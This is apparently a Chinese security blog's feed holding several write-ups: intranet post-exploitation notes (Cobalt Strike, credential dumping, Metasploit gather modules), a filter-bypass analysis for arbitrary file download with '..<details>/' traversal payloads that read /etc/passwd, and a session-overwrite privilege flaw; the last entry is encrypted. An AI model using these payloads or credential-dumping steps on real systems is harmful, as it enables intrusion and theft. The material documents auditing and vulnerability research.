src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006141945754.png" alt="image-20201006141945754"></p><p>getuid此时已经是管理员权限了。</p><p>3.CS</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006150517741.png" alt="image-20201006150517741"></p><p>再创建payload</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006151907054.png" alt="image-20201006151907054"></p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006151927212.png" alt="image-20201006151927212"></p><p>目标已经上线</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006152707356.png" alt="image-20201006152707356"></p><p><strong>1.</strong>常用漏洞利用工具有CS和MSF，两者各有所长，也可以联动使用。这个没搞懂。</p><p><strong>信息收集</strong></p><p>1.系统信息收集</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006164107157.png" alt="image-20201006164107157"></p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006164129875.png" alt="image-20201006164129875"></p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006164157956.png" alt="image-20201006164157956"></p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006164244129.png" alt="image-20201006164244129"></p><p>2.主机密码收集</p><p><strong>1.</strong>使用hashdump和logonpasswords读内存和注册表密码，在Credentials模块下查看</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006164514953.png" alt="image-20201006164514953"></p><p>2.使用LaZagne工具，用于查找本地存储的所有密码，将exe文件上传到目标主机上再执行</p><p>3.补丁信息</p><pre><code>run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives #查看分区run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks   #获取最近的文件操作run post/windows/gather/enum_ie  #获取IE缓存run post/windows/gather/enum_chrome   #获取Chrome缓存run post/windows/gather/enum_patches  #补丁信息run post/windows/gather/enum_domain  #查找域控</code></pre><p>4.使用MSF扫描漏洞模块对存在的应用服务进行漏扫</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006171311906.png" alt="image-20201006171311906"></p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006171331837.png" alt="image-20201006171331837"></p>]]></content>
    
    <summary type="html">
    
      内网
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>记一次任意文件下载绕过过程</title>
    <link href="http://yoursite.com/2020/09/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/09/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87%E8%BF%87%E7%A8%8B/</id>
    <published>2020-09-05T03:25:01.000Z</published>
    <updated>2021-07-29T05:50:46.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="挖掘过程"><a href="#挖掘过程" class="headerlink" title="挖掘过程"></a>挖掘过程</h1><h2 id="转载：https-www-sec-in-com-article-486"><a href="#转载：https-www-sec-in-com-article-486" class="headerlink" title="转载：https://www.sec-in.com/article/486"></a>转载：<a href="https://www.sec-in.com/article/486">https://www.sec-in.com/article/486</a></h2><p>  一般来说，在文件下载/查看功能处，当文件名参数可控，且系统未对参数进行过滤或者过滤不全时，就可以实现下载服务器上的任何文件，产生任意文件下载漏洞。<br>  一般可以通过相关的业务关键字（例如download、filename等）或者相关的操作类（例如InputStream、File等）快速定位相关的模块进行审计挖掘。<br>  前段时间审计某项目时发现一处任意文件下载的绕过。<br>  系统基于Springboot进行开发，首先是发现任意文件下载接口:</p><pre><code class="java">@Value(&quot;$&#123;CERTIFICATE.PATH&#125;&quot;)private String uploadPath;@GetMapping(&quot;/downloadFile.do&quot;)public void uploadFileDownload(HttpServletResponse response,String fileName) throws IOException &#123;    ServletOutputStream outputStream =response.getOutputStream();    String contentType =&quot;application/octet-stream&quot;;    response.setContentType(contentType);    String filePath = uploadPath+fileName;    System.out.println(filePath);    outputStream.write(FileUtils.readFileToByteArray(filePath));    outputStream.flush();    outputStream.close();&#125;</code></pre><p>  相关的接口是下载用户上传的凭证材料的，整个下载过程从配置文件中获取uploadPath，然后与用户输入的fileName进行拼接，最后调用工具类FileUtils的readFileToByteArray()方法进行下载。<br>  查看工具类readFileToByteArray()方法的具体实现：</p><pre><code class="java">public static byte[] readFileToByteArray(String path) &#123;    StringBuffer buf = new StringBuffer();    try &#123;        File file = new File(path);        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(file), &quot;utf-8&quot;));        String row;        while ((row = br.readLine()) != null) &#123;            buf.append(row);        &#125;    &#125; catch (IOException e) &#123;        e.printStackTrace();    &#125;    if (buf.length() == 0) &#123;        buf.append(&quot;&quot;);    &#125;    return buf.toString().getBytes();&#125;</code></pre><p>  可以看到相关的工具类方法直接将传入的地址进行文件内容读取，封装后进行返回，整个文件下载的过程是没有过滤掉”./“、”…/“、”/“等特殊字符，防止用户进行目录回溯的，同时也没有限制下载目录。初步判断是存在任意文件下载风险的。<br>  这里尝试去测试环境访问对应的下载接口进行复现，发现失败了：<br><img src="https://www.sec-in.com/img/sin/M00/00/37/wKg0C18fmMuAEoN4AAB_-fUuTxw134.png" alt="图片.png"><br>  回去查看源代码，发现有一个安全过滤器SecurityFilter，里面针对相关的敏感字符进行了过滤处理。上述任意文件下载接口无法利用很大原因是过滤器Filter的防护导致的，下面来看看能不能绕过过滤器进行利用。</p><h1 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h1><p>  一般来说审计过滤器缺陷主要分以下几个点：</p><ul><li>获取数据的方式是否覆盖全面</li><li>过滤的规则内容</li><li>过滤器的顺序</li></ul><p>  首先是定位过滤器了，这里是通过注解的方式进行过滤器注册的：</p><pre><code class="java">@WebFilter(filterName = &quot;SecurityFilter&quot;, urlPatterns = &quot;/*&quot; )public class SecurityFilter implements Filter &#123;    FilterConfig filterConfig = null;    @Override    public void destroy() &#123;        this.filterConfig = null;    &#125;    @Override    public void doFilter(ServletRequest request, ServletResponse response,            FilterChain chain) throws IOException, ServletException &#123;        chain.doFilter(new XssHttpServletRequestWrapper((HttpServletRequest) request), response);    &#125;    @Override    public void init(FilterConfig filterConfig) throws ServletException &#123;        this.filterConfig = filterConfig;    &#125;&#125;</code></pre><p>  具体实现是通过HttpServletRequestWrapper来获取request的内容，然后通过重写getParameterValues()、getParameter()方法进行处理的。</p><pre><code class="java">public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123;    public XssHttpServletRequestWrapper(HttpServletRequest servletRequest) &#123;        super(servletRequest);    &#125;    @Override    public String[] getParameterValues(String parameter) &#123;        String[] values = super.getParameterValues(parameter);        if (values == null) &#123;            return null;        &#125;        int count = values.length;        String[] encodedValues = new String[count];        for (int i = 0; i &lt; count; i++) &#123;            System.out.println(&quot;before:&quot;+values[i]);            encodedValues[i] = JsoupUtil.clean(cleanAnyFileRead((String) values[i]));            System.out.println(&quot;after:&quot;+encodedValues[i]);        &#125;        return encodedValues;    &#125;</code></pre><p>  这里存在第一种绕过方式，因为对于multipart/form-data这种数据类型上述过滤器明显也是无法获取request提交内容的，那么可以尝试转换multipart的方式进行提交，尝试绕过相关的过滤器：<br><img src="https://www.sec-in.com/img/sin/M00/00/37/wKg0C18fnFqAfHSbAAChd3ThyBA362.png" alt="图片.png"><br>  比较可惜的是，这里对任意文件下载接口并不适用，因为其是用@GetMapping(“/downloadFile.do”)进行注解的，限制了请求方法为GET。<br>  获取数据的方式虽然不全面，但是仅针对/downloadFile.do接口来说的话是足够的了，那么继续往下看相关的过滤规则是否存在缺陷。<br>  这里存在两层过滤，一层是通过cleanAnyFileRead()过滤任意文件上传的敏感输入的，第二层是调用工具类JsoupUtil.clean()方法进行XSS输入过滤。</p><pre><code class="java">@Overridepublic String getParameter(String parameter) &#123;    String value = super.getParameter(parameter);    if (value == null) &#123;        return null;    &#125;    return JsoupUtil.clean(cleanAnyFileRead((String) value));&#125;</code></pre><p>  首先看任意文件下载的过滤，这里是简单的使用正则进行过滤，出现一次或者多次的.且以/结尾的内容都进行过滤，例如…/、./等，这也就解释了为什么前面测试时输入…/…/…/etc/passwd失败了，过滤后返回的内容为/etc/passwd，拼接uploadPath后不存在相关的文件，路径穿越失败：</p><pre><code class="java">private static String cleanAnyFileRead(String value) &#123;    value = value.replaceAll(&quot;\\.+/&quot;, &quot;&quot;);    return value;&#125;</code></pre><p>  继续往下看xss的过滤，JsoupUtil.clean()方法的具体实现如下：</p><pre><code class="java">public class JsoupUtil &#123;    /**     * 配置白名单为基本使用的标签再加上img标签     */    private static final Whitelist WHITELIST = Whitelist.basicWithImages();    /**     * 配置过滤的参数，不对代码格式化     */    private static final Document.OutputSettings OUTPUT_SETTINGS = new Document.OutputSettings().prettyPrint(false);    static &#123;        //富文本编辑时一些样式是使用style来进行实现的 比如红色字体 style=&quot;color:red;&quot; 所以需要给所有标签添加style属性        WHITELIST.addAttributes(&quot;:all&quot;,&quot;style&quot;);    &#125;    public static String clean(String content)&#123;        return Jsoup.clean(content,&quot;&quot;,WHITELIST,OUTPUT_SETTINGS);    &#125;&#125;</code></pre><p>  比较简单粗暴，直接使用jsoup组件进行了过滤。这里简单介绍下jsoup的api：<br>  使用Jsoup的clean方法进行清除HTML标签操作，该方法会清除在你所指定的白名单whitelist中的所有HTML标签。默认的Jsoup提供了5种Whitelist的API</p><ul><li>none()<br>该API会清除所有HTML标签，仅保留文本节点。</li><li>impleTest()<br>该API仅会保留b, em, i, strong, u 标签，除此之外的所有HTML标签都会被清除。</li><li>basic()<br>该API会保留 a, b, blockquote, br, cite, code, dd, dl, dt, em, i, li, ol, p, pre, q, small, span, strike, strong, sub, sup, u, ul 和其适当的属性标签，除此之外的所有HTML标签都会被清除，且该API不允许出现图片(img tag)。另外该API中允许出现的超链接中可以允许其指定http, https, ftp, mailto 且在超链接中强制追加rel=nofollow属性。</li><li>basicWithImages()<br>该API在保留basic()中允许出现的标签的同时也允许出现图片(img tag)和img的相关适当属性，且其src允许其指定 http 或 https。</li><li>relaxed()<br>该API仅会保留 a, b, blockquote, br, caption, cite, code, col, colgroup, dd, div, dl, dt, em, h1, h2, h3, h4, h5, h6, i, img, li, ol, p, pre, q, small, span, strike, strong, sub, sup, table, tbody, td, tfoot, th, thead, tr, u, ul 标签，除此之外的所有HTML标签都会被清除，且在超链接中不会强制追加rel=nofollow属性。</li><li>clean()<br>此外Jsoup的Whitelist提供了addTags方法，利用该方法可以对whitelist进行自定义扩展：</li></ul><pre><code>public Whitelist addTags(String... tags)</code></pre><p>  所以JsoupUtil.clean()方法的效果应该是输入<script>类的内容时,会自动转换为null。<br>  这么一看，相关的恶意数据被过滤了，好像也没啥问题。仔细琢磨下过滤的顺序问题，可以发现其实其中过滤方式是可以绕过进行任意文件下载的。<br>  要想对任意文件下载的接口进行利用，目的是让最后提交下载的地址为…/…/…/…/…/etc/passwd的方式，首先…/、./这种提交方式是直接被过滤掉了的，但是结合前面的正则表达式（出现一次或者多次的.且以/结尾的内容都进行过滤），…tkswifty/这种格式是可以通过过滤器安全检查的。<br>  此时再结合xss过滤，jsoup组件会把类似<script>内容替换为空。然后过滤的顺序是：</p><pre><code>任意文件下载-&gt;xss</code></pre><p>  那么也就是说，尝试使用…<details>/…<details>/…<details>/etc/passwd进行访问可以达到任意文件下载的效果：<br><img src="https://www.sec-in.com/img/sin/M00/00/37/wKg0C18fpaSAKCBbAABQJfgA-5M950.png" alt="图片.png"><br>  到环境上进行验证，成功绕过相关的过滤器安全限制读取了/etc/passwd内容：<br><img src="https://www.sec-in.com/img/sin/M00/00/37/wKg0C18fozWAdmbUAADT-6RGUwQ255.png" alt="图片.png"></p><h1 id="拓展与延伸"><a href="#拓展与延伸" class="headerlink" title="拓展与延伸"></a>拓展与延伸</h1><p>  上面的案例中一个过滤顺序的问题导致了相关的漏洞bypass，越复杂的设计可能存在的安全隐患就越多，针对文件下载业务，一般可以直接在对应的接口进行相关的检查，例如：</p><ul><li>对下载的文件类型进行白名单控制，限制下载的文件后缀；</li><li>使用类似Java的file.getCanonicalPath()判断文件的真实路径，仅允许下载规定路径下的文件。</li></ul><p>  此外，在日常的黑盒测试中，也可以结合常见的过滤器设计进行相关的FUZZ，尝试进行相关任意文件下载的绕过，例如可以结合SQL注入的过滤关键字：</p><pre><code>..|/..|/..|/..|/..|/..|/..|/..|/etc/passwd #Oracle的拼接符是||.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd #调整关键字的位置</code></pre><p>  又比如上述例子中的结合xss的关键字：</p><pre><code>..&lt;details&gt;/..&lt;details&gt;/..&lt;details&gt;/etc/passwd.&lt;details&gt;./.&lt;details&gt;./.&lt;details&gt;./etc/passwd</code></pre><p>  又比如命令执行的关键字nc等。</p>]]></content>
    
    <summary type="html">
    
      任意文件下载
    
    </summary>
    
    
      <category term="转载" scheme="http://yoursite.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="转载" scheme="http://yoursite.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>session覆盖学习</title>
    <link href="http://yoursite.com/2020/09/04/session%E8%A6%86%E7%9B%96/"/>
    <id>http://yoursite.com/2020/09/04/session%E8%A6%86%E7%9B%96/</id>
    <published>2020-09-04T12:50:01.000Z</published>
    <updated>2021-07-29T05:50:52.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="session覆盖"><a href="#session覆盖" class="headerlink" title="session覆盖"></a>session覆盖</h1><p>上次挖到的某大学信息门户任意用户越权漏洞用的就是这个原理，所以想记录一下。</p><p>吐槽： 我交了五次报告都没让我过，EDUSRC的审核太强了吧。</p><p>例如登录、忘记密码、查看个人信息等。一般情况下，相关的业务凭证存在设计缺陷的话，会存在类似平行/垂直越权等安全问题。常见的业务凭证及越权场景有：</p><ul><li>用户身份id（userid，例如通过userid越权查看用户信息）</li><li>对象id（fileid，例如通过fileid越权查看其他用户的备案资料（身份证、手机号、住址等））</li><li>基于文件名（例如可以遍历时间戳组成的文件名获取用户订单）</li><li>Cookie中的字段（例如增加user=admin，即可垂直越权访问管理员模块）</li><li>Session中的内容（例如session覆盖）</li><li>…</li></ul><p>  一般在测试时，可以通过寻找相关的凭证，通过遍历、猜解等方式，进行业务逻辑缺陷的发掘。<br>  前段时间审计某项目时发现一处结合忘记密码发送短信功能进行session覆盖越权的业务缺陷，下面是具体的发现过程。</p><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>在实际代码中，用户登入后会将用户凭证于session会话进行绑定，当访问业务接口时，因为业务凭证不再是userid这种可控的参数，从而一定程度的防范了越权的缺陷。</p><p>下面是登陆过程的实现：</p><pre><code class="java">@RequestMapping(value = &quot;/loginAuth&quot;)public String login(String loginName,String password,String captcha,HttpSession session)&#123;    String VerifyCode = session.getAttribute(&quot;captcha&quot;);    if(StringUtils.isBlank(loginName))&#123;        return ResponseData.fail(&quot;用户名为空&quot;);    &#125;    if(StringUtils.isBlank(password))&#123;        return ResponseData.fail(&quot;password&quot;);    &#125;    if(StringUtils.isBlank(VerifyCode)||StringUtils.isBlank(captcha)||!VerifyCode.equals(&quot;captcha&quot;))&#123;        return ResponseData.fail(&quot;验证码错误&quot;);    &#125;    //防止验证码复用问题    session.removeAttribute(&quot;captcha&quot;);    //登录逻辑    User user=userService.loginAuth(loginName,password);    if(user!=null)&#123;        session.setAttribute(&quot;loginName&quot;,user.getName());        ......    &#125;else&#123;        return ResponseData.fail(&quot;账号密码错误&quot;);    &#125;&#125;</code></pre><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程<img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/wKg0C18umDqAdXgVAABPnhyXh3w286.png" alt="image.png"></h3><p>通过拦截器拦截未授权访问：</p><pre><code class="java">String loginName=(String)session.getAttribute(&quot;loginName&quot;);if(StringUtils.isBlank(loginName))&#123;        throw new Exception(&quot;Not logged in Exception&quot;);&#125;</code></pre><pre><code class="java">@RequestMapping(value = &quot;/getUserCard&quot;)public Object getUserCard(HttpSession session)&#123;    List&lt;String&gt; cardIds = userService.getUserCard(session.getAttribute(&quot;loginName&quot;));    return CardService.getCardInfo(cardIds);&#125;//查询用户信息</code></pre><p>然而在忘记密码处确存在session覆盖漏洞，和我上次的在修改密码找到的session覆盖处原理大致相同。</p><pre><code class="java">@RequestMapping(value=&#123;&quot;/getMessage&quot;&#125;)@ResponseBodypublic Object getSecPwdQuestion(HttpServletRequest request, HttpServletResponse response,HttpSession session) throws Exception&#123;    String loginName = request.getParameter(“loginName”);    if (StringUtils.isNotBlank(loginName)) &#123;    session.setAttribute(&quot;loginName&quot;,loginName);    User user = this.UserService.getUserByLoginName(loginName);    if (user != null) &#123;        //获取短信    ......    &#125;else&#123;        return ResponseData.fail(&quot;用户不存在&quot;);    &#125;&#125;</code></pre><p><strong>可以看到这里其实是可以通过发送短信的方式来控制session会话中的loginName参数的</strong>。首先通过忘记密码模块/getMessage接口发送请求，通过忘记密码的手机号设置对应的loginName，然后再访问/getUserCard接口，即可越权获取对应用户的卡号信息了。</p><p>同理上次的越权漏洞流程应该是修改密码-&gt;后台修改session-&gt;在系统弹出前进入信息门户（类似于竞争上传的原理）-&gt;成功越权。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>因为上传挖到的漏洞无法获得源码，所以以上是我对上次挖洞的原理猜测，如果有误还请大佬告知。</p>]]></content>
    
    <summary type="html">
    
      Session覆盖学习
    
    </summary>
    
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化的学习</title>
    <link href="http://yoursite.com/2020/09/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/09/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-09-04T11:08:01.000Z</published>
    <updated>2021-07-29T05:50:51.682Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="249c47010bb220d88e6ce9c01b24a6c06e17e5f17be8e61d2b7211976dc399d2">11bed9e228e02eb8f0061e325ad07d9123db68ff2ec18ca1c0bc29e777f467bc6aaf3c2460ab09769460fa2ddbd9ae15e1bbdd5d4bfd9b963703b0ac43337d54fcab4707162527874338bd631f6d53a26bb44dbd0f850550eca3f9dee108a63ccc095fe51301f7b4e3b5caaafd233deff02827100c9168b4f27ba6e441fb8f8c783e61126feb5394572be39a104ffeb0acf22212673a85762bce863ad997eabc7d2707d74989658cc08875588be17ad877e8d43f1f4d68005d8e11937790c0f831dc3395d329aa717554cf0530015f24a5ff0eca777682442d577396c0a0d7a5710eb461edbfcace5717e2133e9fbad71c82f9cae61e03d9817d2d67a3df499dd43c878e526b6ca8a3fd19d0093fb8c72b769cb6e7f785431340e40bcd60aada7cae60b96007bd442afbee4ff2edf9009494e2848f23ec17c979f5267a541286cf45212455fa15ce5c13330545ebb6b9c7d9bee3c566be7a442e5e06951f6805efe9138165a2688db7cd8571a1580e1d0396ceba94b5b1950df4508e08c3743f3d881e8601e3e349f6e553f522a6adf4517b980044f08dd6843bfe5b7f53dccd0d1408dd2f57e0d732dc453017f12c47c4836d12c85816751779dd58d23560d565fe7a4aeb582a1343fa5b10c6478583b94e4466c655e25f60e65635b470c0999a1f7fdf8e3373a0dccfad0322c83e566954cd54cd22bd32b96a15130d8aaa78c108dcbe2d3e5ab1544b92742b7253f4226693e761e1bc50d060ac3c699c61ab84c5b1c5079f9aede6d9dd9f61bb753f9dcce7d05701185f89cde19b9b559bf55cfd31912877fd25756173c2363eed48ce2d34e68059ba9b0a72bd3053ec9b10315b7970417e128fa0f58b0b5713b477f11978ed062b6be8c2fb8186ac5e0b0c34c15f9a83a3610a053a9c5d5ba1fcbd80844ece7fa4293b058f8a18dc9cbc8d1602b87f34823b08421114874d6417a85df4254eb8f83aba5e9354d2742c71acead85c58982f50e817b86d0eb70b97d48f9b8d494860a2193023b8e8f763f8a467ba841ef446c0890ec78cf07189f5f367d07ac16fdabb828094702ce8ee1d54b4100be676a150d5387052c9cc39e1b51595658f54a81fc580eea7e3756d13e3c574f280677b845b1dcb42f95cf77287695dd0fab49b97d6490e4ba0b225c628eac22dd9ac5bfb6a52fb6a1e0e48530f999525c7c4fd2a0485c81e71c433be5f955208dccce70dfdc20c4446990ee30762a3590cf46040680df4820b8a9a3b3c0274528773789e8305ac8d8a0753e9a5fc67fc5daa839820ae2c8b62e5164566c4071c76d1fbce1a3bc199eeaf03d5889ce9b2f5ba0d5e8dd2098f276ce30958fa16ddf1f6424bb39c0031de92e1fafa48697bb4492d67181f2804be0c240694128eb4097db4e2256fdc3f3ed352ace66d1a1dd7654a212b580352f47ca1c5ff3f65f3f541b3406fd6e96fc296b1fb3f1530e4ab24e21369a023a583f936cac5f6b8c2bab57ab05952f2e5a1baf8f18780aca2b11e147572b48ba08b866575529398dc01790afcd4b7a19fb23ccc005ab96849e7ae3c19780c704c5f25417f7286deee17e3a8687d013cfd1f653b0798625b81a1ee9cb56804a74c280041d72cd5f136412c26fdd1edd9085b7dd7a1ff4fcc83114b1cadb1e268a2ef08c36464e29c526c1be48e5257847236fae3ef7b5260d9d67dce8590b98182e92a74cd899b5eadd12b963c13d83621e47f8c3f207ab30aa590c8bb0aeb5699cb93197937a93518dce77931425ee5365907f56d3dafd67512c4c7222ac75f0cb4f23e178521803afbbb80b9000264d610f83d1354919b9ceb41c1efaa9a9859d80c412163c864b180bbe05d2552955d5ccadaf783caac3fd47aa0c05fd328fc20cfe8df6c556096c8db91129b7b1652c1d6c90b1e4db20e9b7dde04294cf572d18549ccc04b339f26f26002fe3113933ccb9e85cce0745d3d3aa97adbf04d60ba3cfae0f82367cca9e176069cb916001b8e47c0380715b13c78f68c3507ae089a66a1518b7d072852c7411a4c26f2f3905a71698dbe9865795725f391fcc89f2899cab5316dd84433692ace34dd97f4d088cf1b2863d01de92df874431983f089b1fa3ffe2379dd1f29712eec80ee52f8072496ae68b7b05e504627a6b0c9317efe165925892ef136e07c5988b6ad4f3068b25c953288faa65dfab5d745b3526e407f5bb723573847ccabffd93a241992c61ddc4748c7e2533560e735d2e2f2c4e79acbad0d1a60afa873b69bf83710ea0d13ec1f4cf4c42d62c826be3ee289ad313dfb6bd21730f3a2ee210f4c9609525c5703641f5548d47c238b6d2cfe8e1a2c8c44ed23d1edc48a9524bb96e598d8c0266742e2bc25347c158748a3ce4899691925bf8b8428fc5d3c1c1d923109aca58f81137671ede7da7a97b3ce7a8ec02707ce5984652a737851afae43d8e5cf3c532e22f40574f08e8b28803996f95d40222e73185cfa578a888b2e10812680e565b824e815cbe00cc5e3b96e62123c0c1e27ba2566ba4949c91a99af9e30aeec9939f2ec49d5eb4069172aac0cc09b29000f5f8c12ad2a0fdec974e3a4a306e8c50c7a466373fba69c2a3c4c8d503f4f8b3515ee612bc3eac2b14690ffcda3b7eb2d625cc54fae79c8aa37fa1eb9b12989f97abef4d5b13732dfe7e64a0ab51c36a018b7dbfd6cb6678b84ede7c5f3e03fdfbd7e6f942b46169a9826337c4f5bbf3df92cdb62740e100c6188622d9e18086659a060fe41202c45419f75755dfab39b74ab3b1565b651db42b57f438eff0256def217572253a3c45ea972771a84b244394fc51e76a20030639f828e3cdc402c2ff79b5ce27b2412cbf10c0511aa2714c2b24e8fabca7e7f1566c174b8878988d09cb6ba139d608e593812cd9b4a4626989cb9a1d158bc0e4f177205a6820c7abcc90a16926106ba9cdfff9e470fd1eb009f25930fc8536df107e07712954039e9a5dcd2c0d73f89dc2de773c1fd47c61c25cdb1fa13f22eb2aa7d456afc64098aa51a618bb248b977cc06954d6e262f651b261a44dfdce7acf11ec751576aeac7cd48f93944e12164373e21ef3e99c802741f201c65dda84aa7012ba34975a40e04e9ae81a20016b254dae342b356d8882daf4c8762418b7c442c64daeaab70aa75fbe302d26e8a724f407f1c28b454d7d7d7ec16061f57e6de4006688883217b613ebc878e97b3bd3b57d7be4cc13fffa1d437390e6e82bdf08320c8b8ba011a3d705dd1aa43e6a82bfa18465a212d4504fbdbca3e75fb8e701ebc0fe7581dab02b9cc4d7b461a9c02a8ac95ee1c814cf670af2c99b07624f0fcf09709dae96638f6f76e6430eacedbcb658893cf5b9bac887e48aef5951951b44ef31c21ca396fa3e2fcbed906502305f17522a41f277be108cd60279d87114be7356bcfed7fa101e9ba3274e5fc5d3c68d5f8bd304d44313a33bd53da23f9dc24b7b2c5165127f95d2eb5d577992dd3dea8a10cdeedad78891e597d594318afc496c99541bb24baa7eb11d2a8bd5df6c19cd96e83fe5c8ffb190c9e46754f03c950163680fcb0be9161b89fd6c293a9ab5cd785fa3f87029d431d0fb31e497fd8c945eab1896ba971f941acbe7b44234762d7c55ca6e99403a70150cc606525b81747e4a5550f7fd31ce7994afaa1b66180975f9f156052e59bc98b82e6ef3a59081408cdeb076195c88292dc7b157dfb5332884be189d69e8d3a9e010c03f94b7778161094d74ef6f5ae48721016a9566a4c991be2e4996e2cfdd77dc98f5bea1f33b745272bf5a94075c2446356dc7c6b072e2ceeb7b7b96ecabc69137d40ca96755e4c7c5f088243010219fe71cc837e3d67ffb46113aaacaf5af7e1868c5a01d5ba182ca3c27166db8dc73c7b7241ee732f89fbfd99888c7b691a7068489c40c4a34614bd7c2032d8fe3315007b64a96fc941399f216e411de5f420649271fa6e64aa8be7c2c615eec17321e34b6cfa37f00c19e3b65b0d82505f4a41eaa894087161cb36777219367c44b8db37199343cf41a84528c3f7f37469ce24909f34a595296e15f15edb0b23235ab64098133fbadd277a8e68e8d257ee17eb60c91277a422f2fda53c00f61b9dc416e24e90d355de2d71a11104583f2907f6d8635711fc5170f40402be5dbc877301641b3ffee83fcb3b88c6566877e5ae468eeb38c828c05e60c28cf02e682e997cb0f4294e879a5964558f44f66a0cf5504409b10d7520c346b8865536e02eb0ff09609aee38e308ea0c8d66fce2a6c4a855e63050729d923147dbb111538f03e0ce5cd64502ed4ab91b7f9f5b2204da08caab42e1842f6bd4ce8e22239691b4bbf37f708e29e2fa85ff46949e91c6a0aa95b5fb84fc4ebdca5dc79083eff378a50e9524ca018e2bee27839a5a805cd586e2c189573bbded992bc9ea7fd58a309edf55875505cb5e36eb189274ff23bd221b61a52bced81749d7c649b0df228dff106bacd7d2a9d1d90b7555f1ce13c9f30e37e1dc06088788a5cd5d97acd5a287807f23a91e204e9071f91451f5e5af295df1609b0dab8569f4248a25373724060477ef3545b636e6952e80e6132211de88b50a48fc2f45355ff6b93eb68b9e1a88a63677172df5a5bfb55b6b5c0116e9dce6d8b8b1caf19eb40bb613e3d77b9a965cf1b0e10988e8033b768523a969d43eac3de7a2b72f086b9f105ff772899e85ed8f75344cfd8fc5869e325e8e5bffd50a19579816a12be4e426642dfaddd1b71471cf2f1fa104016b45a0e00f2d101ed0db838ec8abef51c6444a5536032de31be16f6afceb364d018ca8ca7b632a6a81d6b419e346f276d3a2bbabd4d60c600ea7f9ebc7747a7d3596b8c4e384edd612a12ada49a8c0803296aeb38e6d07dace73a8d81e937665fa681f55d6130a282044847ae7f7f5a9262a9f92fc86d84e549189bcadaf2b76e271f2b8348f6924b76dfe2f18b9461912eb5e39735774fe1908b98af01dcdb77f0ff188cd5d749dc478492a52da7dd5171ad7a1cedc2eee318c723f394a420ce46f87a34937a92154a076d478f4ea0e7e7c08e4a120dacb29acbd7eef5a9bd129c729c8da8570a39313ef04c88524ec1168cd9fc7c5de6d5c25534a01eb0067e574e7068d246f183809ccf2f7faf84bb97b36582e62b5bd0c0895e59418646eef576cfd7e8de4de099dd0e1975791027fb66fcf0ed3dbbba40516e9cf63a399282b48471b2a1eda2498619097718a890e4b9af479a533664a7042a9489639ef2165eda24f147eb00d61eb68dc62181fa0672b6b8fc5d2598af983e3f80d1cd2fede70f9f08b044062cbfc7505ad113ffd23608f47aac64452ba651a07caf68a29789fe714a7cc2268349486858b98359c1b07cf7b8b092a354056d8fe36871ef78d5a72ed